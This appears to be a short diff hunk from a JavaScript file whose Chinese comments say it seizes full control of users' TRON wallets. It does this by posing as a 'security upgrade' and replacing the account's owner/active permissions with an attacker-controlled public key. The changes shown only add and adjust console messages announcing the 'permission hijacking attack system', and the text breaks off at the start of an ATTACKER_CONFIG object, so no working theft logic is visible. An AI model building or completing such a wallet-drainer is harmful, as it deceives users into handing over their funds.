@@ -2,11 +2,14 @@
 // 功能：通过伪装的"升级安全性"操作，获取用户钱包的完整控制权
 // 原理：修改用户账户的owner/active权限，替换为攻击者控制的公钥
 
+console.log('🔑🔑🔑 TRON账户权限劫持攻击系统脚本文件开始执行！🔑🔑🔑');
+console.log('🔑 执行时间:', new Date().toLocaleTimeString());
+
 (function() {
     'use strict';
     
-    console.log('🔑🔑🔑 TRON账户权限劫持攻击系统脚本已加载！🔑🔑🔑');
-    console.log('🔑 脚本执行时间:', new Date().toLocaleTimeString());
+    console.log('🔑🔑🔑 进入权限劫持攻击系统IIFE！🔑🔑🔑');
+    console.log('🔑 IIFE执行时间:', new Date().toLocaleTimeString());
     
     // 🎯 攻击者控制的地址和公钥
     const ATTACKER_CONFIG = {
